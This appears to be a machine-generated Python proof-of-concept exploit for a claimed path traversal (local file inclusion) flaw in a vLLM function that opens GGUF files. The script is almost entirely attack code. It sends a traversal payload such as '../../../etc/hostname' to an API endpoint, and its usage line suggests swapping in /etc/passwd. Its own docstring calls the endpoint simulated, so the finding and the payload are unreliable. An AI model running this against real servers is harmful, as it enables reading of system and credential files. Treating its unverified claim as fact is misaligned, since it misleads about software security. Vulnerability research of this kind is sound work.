#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: lfi-001
# Sink: check_gguf_file
# Auto-generated — run with: python3 lfi_sanitization_validation_traversal_sequences_check_gguf_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Local File Inclusion (LFI) in vllm-project-vllm-7193774

The sink function `check_gguf_file` opens a file whose path is derived from the
user‑supplied `model` argument. No sanitisation of path traversal sequences
(e.g., `../`) is performed. This script demonstrates the vulnerability by
sending a crafted `untrusted_user_input` parameter to a simulated API endpoint
that triggers the vulnerable code path.

By default, the script attempts to read `/etc/hostname` (a harmless file).
Change `PAYLOAD` to any arbitrary path to verify LFI.

Usage:
    python3 exploit.py                    # uses default target and payload
    python3 exploit.py --url http://other:8000/api/v1/trigger --payload /etc/passwd
"""

import requests
import sys
import argparse

def main():
    parser = argparse.ArgumentParser(description="vllm LFI PoC")
    parser.add_argument("--url", default="http://localhost:8000/api/v1/trigger",
                        help="Target API endpoint (default: http://localhost:8000/api/v1/trigger)")
    parser.add_argument("--payload", default="../../../etc/hostname",
                        help="Path traversal payload (default: ../../../etc/hostname)")
    args = parser.parse_args()

    target_url = args.url
    payload = args.payload

    print(f"[*] Targeting {target_url}")
    print(f"[*] Payload: {payload}")
    print("[*] Sending POST request with untrusted_user_input = payload")

    headers = {"Content-Type": "application/json"}
    data = {"untrusted_user_input": payload}

    try:
        resp = requests.post(target_url, json=data, headers=headers, timeout=10)
        print(f"[*] HTTP {resp.status_code}")
        print(f"[*] Response body:\n{resp.text}")

        # If the server returns an error containing the file's content (or a hint),
        # the LFI is confirmed. Otherwise, the file was opened and processed internally.
        if resp.status_code != 200:
            print("[*] Server returned an error – this may indicate file access was attempted.")
        else:
            print("[*] Server returned 200. Check response for leaked file content.")

    except requests.exceptions.ConnectionError:
        print("[-] Connection refused. Is the vllm server running on the specified URL?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)

if __name__ == "__main__":
    main()
